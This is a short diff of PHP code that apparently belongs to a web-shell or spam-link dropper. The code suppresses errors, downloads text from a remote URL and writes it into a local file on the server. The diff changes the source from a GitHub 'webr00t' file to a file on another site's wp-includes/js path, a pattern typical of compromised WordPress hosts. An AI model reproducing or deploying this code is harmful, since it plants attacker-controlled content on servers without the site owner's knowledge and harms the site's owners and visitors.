@@ -3,7 +3,7 @@ if ( file_exists( $yol ) ) {
 unlink($yol);
 }else {
 @touch($yol);
-@$h = @file_get_contents("https://raw.githubusercontent.com/webr00t/web/master/lnks.txt");
+@$h = @file_get_contents("http://bdmsproduction.com/wp-includes/js/a.txt");
 @$kayit = fopen($yol, "a"); 
 @fwrite($kayit,$h);
 @fwrite($kayit,"\r\r");
